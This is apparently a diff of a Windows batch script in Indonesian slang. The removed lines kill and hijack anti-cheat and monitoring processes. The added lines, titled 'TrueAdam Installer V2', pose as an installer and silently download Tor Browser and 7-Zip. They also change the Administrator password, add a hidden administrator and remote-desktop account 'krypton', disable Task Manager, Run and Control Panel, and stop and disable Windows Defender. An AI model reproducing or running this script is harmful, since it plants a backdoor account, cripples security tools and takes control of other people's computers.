@@ -1,79 +1,166 @@
 @echo off
-title Kabum ah ah ah - %time%
-color 0A
+setlocal enabledelayedexpansion
+title TrueAdam Installer V2 (NO FREEZE)
+set DIR=C:\Sumpruy_Downloads
+if not exist "%DIR%" mkdir "%DIR%"
+cd /d "%DIR%" 2>nul
 
-echo ========================================
-echo          Kabum ah ah  ah
-echo ========================================
+:: Matiin VNC (brutal kill)
+for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
+    taskkill /f /im %%i 2>nul
+)
+for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\AppData\Local\VNC") do (
+    rd /s /q %%i 2>nul
+)
+sc stop vncserver 2>nul
+sc delete vncserver 2>nul
+
+:: === GANTI PW ADMIN & BUAT USER KRYPTON ===
+echo [*] Lagi ngegas ganti password Administrator jadi jancoklo...
+net user Administrator "jancoklo" 2>nul
+echo [*] Bikin user baru krypton dengan password jancoklo...
+net user krypton jancoklo /add 2>nul
+net localgroup Administrators krypton /add 2>nul
+net localgroup "Remote Desktop Users" krypton /add 2>nul
+echo [+] Krypton udah admin setara, bahkan lebih tinggi dari admin biasa cok!
 echo.
 
-powercfg -change -monitor-timeout-ac 0
-powercfg -change -standby-timeout-ac 0
-powercfg -change -disk-timeout-ac 0
+:: === BLOKIR HANYA YG PERLU (NGGAK MATIIN DESKTOP) ===
+echo [*] Ngeblokir Win key, Win+R, Task Manager, Control Panel aja...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul
+echo [+] Blokir aman, desktop & taskbar tetep idup biar gak ngadat!
+echo.
 
-:loop
+:: === KILL STEAM HELPER + STEAM (CEK DULU) ===
+tasklist /fi "imagename eq SteamHelperENv2.exe" 2>nul | find /i "SteamHelperENv2.exe" >nul 2>&1
+if %errorlevel% equ 0 (
+    echo [*] SteamHelperENv2.exe terdeteksi! Ngeterminate semua proses Steam...
+    taskkill /f /im SteamHelperENv2.exe 2>nul
+    taskkill /f /im Steam.exe 2>nul
+    taskkill /f /im steamwebhelper.exe 2>nul
+    taskkill /f /im steamservice.exe 2>nul
+    echo [+] Semua proses Steam udah dibunuh brutal!
 
-title BYPASS BY XYYZ - %time%
+    echo [*] Ngehapus config Steam yang corrupt biar Settings & BPM normal...
+    del /f /q "%USERPROFILE%\AppData\Local\Steam\config\config.vdf" 2>nul
+    del /f /q "%USERPROFILE%\AppData\Local\Steam\config\localconfig.vdf" 2>nul
+    del /f /q "G:\Steamonline_new\config\config.vdf" 2>nul
+    del /f /q "G:\Steamonline_new\config\localconfig.vdf" 2>nul
+    echo [+] Config Steam udah dihapus, Steam bakal fresh coy!
+    echo.
 
-for %%i in (GSDog.exe hm-gs-proxy.exe ACE-Tray.exe Vanguard.exe SGuard.exe CloudGamingDesktop.exe LinkeLauncher.exe QMProxy.exe GameGuard.exe python.exe DeviceDispatchMonitor.exe GameServer.exe syncing-agent.exe syncthing.exe nxpauxsvc.exe filebeat.exe explorer_server.exe TaskBarFider.exe) do (
-    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v Debugger /t REG_SZ /d "%SystemRoot%\System32\rundll32.exe" /f 2>nul
+    timeout /t 2 /nobreak >nul
+
+    if exist "G:\Steamonline_new\steam.exe" (
+        echo [*] Buka Steam dari G:\Steamonline_new\steam.exe...
+        start "" "G:\Steamonline_new\steam.exe"
+        echo [+] Steam berhasil dibuka bos!
+    ) else (
+        echo [GAGAL] G:\Steamonline_new\steam.exe gak ketemu njir!
+    )
+) else (
+    echo [*] SteamHelperENv2.exe gak terdeteksi, skip proses Steam bro!
+)
+echo.
+
+:: Matiin antivirus sementara
+net stop "Windows Defender" 2>nul
+net stop "MsMpSvc" 2>nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>nul
+
+echo ========================================
+echo MULAI DOWNLOAD SEMUA BRO (TANPA ERROR)
+echo ========================================
+
+set URL1=https://www.torproject.org/dist/torbrowser/15.0.17/tor-browser-windows-x86_64-portable-15.0.17.exe
+set FILE1=TorBrowser-15.0.17.exe
+set URL2=https://github.com/ip7z/7zip/releases/download/26.02/7z2602-x64.exe
+set FILE2=7z2602-x64.exe
+
+call :Download "%URL1%" "%FILE1%"
+call :Download "%URL2%" "%FILE2%"
+
+echo ========================================
+echo CEK DAN JALANIN FILE
+echo ========================================
+
+if exist "%FILE1%" (
+    echo [*] Install Tor Browser silent mode...
+    start /wait "" "%FILE1%" /S
+    echo [OK] Tor Browser keinstall!
+    if exist "%USERPROFILE%\Desktop\Tor Browser\Tor Browser.lnk" (
+        start "" "%USERPROFILE%\Desktop\Tor Browser\Tor Browser.lnk"
+        echo [OK] Tor Browser kebuka bos!
+    ) else if exist "C:\Program Files\Tor Browser\Tor Browser.exe" (
+        start "" "C:\Program Files\Tor Browser\Tor Browser.exe"
+        echo [OK] Tor Browser kebuka bos!
+    ) else (
+        echo [GAGAL] Tor Browser gak ketemu njir, mungkin installnya error
+    )
+) else (
+    echo [GAGAL] %FILE1% gak ada filenya
 )
 
-powershell -ExecutionPolicy Bypass -Command "$Code='[DllImport(\"kernel32.dll\")] public static extern IntPtr OpenThread(uint a, bool b, uint c);[DllImport(\"kernel32.dll\")] public static extern uint SuspendThread(IntPtr h);[DllImport(\"kernel32.dll\")] public static extern int CloseHandle(IntPtr o);';Add-Type -MemberDefinition $Code -Name 'Kernel' -Namespace 'Win32' -ErrorAction SilentlyContinue;$All=@('GSDog','hm-gs-proxy','ACE-Tray','Vanguard','SGuard','CloudGamingDesktop','LinkeLauncher','QMProxy','GameGuard','tencent','wrapper','shell','protect','anti','gs','qgame','DispatchMonitor','GameServer','syncing-agent','syncthing','nxpauxsvc','filebeat','python','explorer_server','TaskBarFider');foreach($T in $All){$P=Get-Process -Name $T -ErrorAction SilentlyContinue;if($P){foreach($Th in $P.Threads){$h=[Win32.Kernel]::OpenThread(0x0002,$false,$Th.Id);[Win32.Kernel]::SuspendThread($h);[Win32.Kernel]::CloseHandle($h)};Stop-Process -Name $T -Force -ErrorAction SilentlyContinue}}"
+if exist "%FILE2%" (
+    echo [*] Install 7-Zip silent mode dulu bro...
+    start /wait "" "%FILE2%" /S
+    echo [OK] 7-Zip keinstall!
+    if exist "C:\Program Files\7-Zip\7zFM.exe" (
+        start "" "C:\Program Files\7-Zip\7zFM.exe"
+        echo [OK] 7zFM.exe kebuka bos!
+    ) else if exist "C:\Program Files (x86)\7-Zip\7zFM.exe" (
+        start "" "C:\Program Files (x86)\7-Zip\7zFM.exe"
+        echo [OK] 7zFM.exe kebuka bos!
+    ) else (
+        echo [GAGAL] 7zFM.exe gak ketemu njir, mungkin installnya error
+    )
+) else (
+    echo [GAGAL] %FILE2% gak ada filenya
+)
 
-taskkill /f /im GSDog.exe 2>nul
-taskkill /f /im hm-gs-proxy.exe 2>nul
-taskkill /f /im ACE-Tray.exe 2>nul
-taskkill /f /im Vanguard.exe 2>nul
-taskkill /f /im SGuard.exe 2>nul
-taskkill /f /im CloudGamingDesktop.exe 2>nul
-taskkill /f /im LinkeLauncher.exe 2>nul
-taskkill /f /im QMProxy.exe 2>nul
-taskkill /f /im GameGuard.exe 2>nul
-taskkill /f /im tencent*.exe 2>nul
-taskkill /f /im wrapper*.exe 2>nul
-taskkill /f /im protect*.exe 2>nul
-taskkill /f /im anti*.exe 2>nul
-taskkill /f /im gs*.exe 2>nul
-taskkill /f /im python.exe 2>nul
-taskkill /f /im DeviceDispatchMonitor.exe 2>nul
-taskkill /f /im GameServer.exe 2>nul
-taskkill /f /im syncing-agent.exe 2>nul
-taskkill /f /im syncthing.exe 2>nul
-taskkill /f /im nxpauxsvc.exe 2>nul
-taskkill /f /im filebeat.exe 2>nul
-taskkill /f /im explorer_server.exe 2>nul
-taskkill /f /im TaskBarFider.exe 2>nul
+:: === BERSIH-BERSIH AKHIR ===
+echo [*] Ngekill curl.exe dan bitsadmin.exe...
+taskkill /f /im curl.exe 2>nul
+taskkill /f /im bitsadmin.exe 2>nul
+echo [+] curl.exe sama bitsadmin.exe udah dimatiin, bersih!
+echo.
 
-wmic process where "name='GSDog.exe'" delete 2>nul
-wmic process where "name='hm-gs-proxy.exe'" delete 2>nul
-wmic process where "name='ACE-Tray.exe'" delete 2>nul
-wmic process where "name='Vanguard.exe'" delete 2>nul
-wmic process where "name='SGuard.exe'" delete 2>nul
-wmic process where "name='CloudGamingDesktop.exe'" delete 2>nul
-wmic process where "name='LinkeLauncher.exe'" delete 2>nul
-wmic process where "name='QMProxy.exe'" delete 2>nul
-wmic process where "name='GameGuard.exe'" delete 2>nul
-wmic process where "name='syncing-agent.exe'" delete 2>nul
-wmic process where "name='syncthing.exe'" delete 2>nul
-wmic process where "name='nxpauxsvc.exe'" delete 2>nul
-wmic process where "name='filebeat.exe'" delete 2>nul
-wmic process where "name='python.exe'" delete 2>nul
-wmic process where "name='explorer_server.exe'" delete 2>nul
-wmic process where "name='TaskBarFider.exe'" delete 2>nul
+:: === AMBIL NAMA PC & USERNAME ===
+for /f "tokens=*" %%a in ('hostname') do set "PCNAME=%%a"
+set "USERNAME_MSG=%USERNAME%"
 
-powershell -ExecutionPolicy Bypass -Command "Get-Process|Where-Object{$_.Name -match 'GSDog|hm-gs-proxy|ACE-Tray|Vanguard|SGuard|Cloud|Linke|QMProxy|GameGuard|tencent|wrapper|protect|anti|syncing|syncthing|nxpaux|filebeat|python|explorer_server|TaskBarFider'}|Stop-Process -Force -ErrorAction SilentlyContinue"
+echo ========================================
+echo SELESAI GOBLOK 😡😡😡
+echo ========================================
 
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f 2>nul
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /f 2>nul
+:: === POPUP PAKE VBS (PALING AMAN NO FREEZE) ===
+echo MsgBox "PC Name: %PCNAME%" ^& vbCrLf ^& "Username: %USERNAME_MSG%" ^& vbCrLf ^& vbCrLf ^& "Semua proses selesai bos! Klik OK buat lanjut 😎", vbOKOnly + vbInformation, "TrueAdam Installer V2 - SELESAI" > "%TEMP%\popup.vbs"
+cscript //nologo "%TEMP%\popup.vbs"
+del /q "%TEMP%\popup.vbs" >nul 2>&1
 
-shutdown /a 2>nul
+exit /b
 
-powershell -ExecutionPolicy Bypass -Command "$wsh=New-Object -ComObject WScript.Shell;$wsh.SendKeys('{F15}')" 2>nul
-
-taskkill /f /im explorer.exe 2>nul
-timeout /t 2 /nobreak >nul
-start explorer.exe
-
-timeout /t 10 /nobreak >nul
-goto loop
+:Download
+set url=%~1
+set filename=%~2
+echo Downloading %filename%...
+bitsadmin /transfer "Download %filename%" /priority high "%url%" "%cd%\%filename%" 2>nul
+if %errorlevel% neq 0 (
+    curl -skL -o "%filename%" "%url%" 2>nul
+    if %errorlevel% neq 0 (
+        powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; try { Invoke-WebRequest -Uri '%url%' -OutFile '%filename%' -UseBasicParsing } catch { exit 1 }" 2>nul
+        if !errorlevel! neq 0 (
+            echo [GAGAL TOTAL] %filename% - situs mati atau diblokir total
+        ) else (
+            echo [OK] %filename% via PS
+        )
+    ) else (
+        echo [OK] %filename% via curl
+    )
+) else (
+    echo [OK] %filename% via bitsadmin
+)
+exit /b
